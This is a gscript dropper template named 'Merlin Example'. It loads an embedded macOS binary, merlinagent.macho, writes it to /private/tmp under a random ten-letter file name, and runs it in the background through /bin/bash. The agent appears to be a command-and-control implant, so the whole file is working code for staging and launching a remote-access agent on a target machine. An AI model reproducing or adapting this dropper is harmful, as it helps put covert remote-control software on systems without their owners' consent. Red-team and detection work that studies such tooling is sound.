// Example gscript template
// Title: Merlin Example
// Author: ahhh
// Purpose: Drops merlin as an asset and executes it async
// Gscript version: 1.0.0
// ATT&CK: 

//priority:150
//timeout:150
//import:/private/tmp/merlinagent.macho


function Deploy() {  

    console.log("Starting to drop merlin binary");
    // Getting our asset
    var merlinBin = GetAssetAsString("merlinagent.macho");
    //console.log("merlinBin: "+merlinBin);
    console.log("errors: "+merlinBin[1]);

    // Getting a random string
    var basepath = "/private/tmp/";
    var naming = G.rand.GetAlphaString(10);
    naming = naming.toLowerCase();
    var fullpath = basepath+naming;
    console.log("file name: "+ fullpath);

    errors = G.file.WriteFileFromString(fullpath, merlinBin[0]);
    console.log("errors: "+errors);

    var running = G.exec.ExecuteCommandAsync("/bin/bash", [fullpath, "&"]);
    console.log("errors: "+running[1]);

    return true
}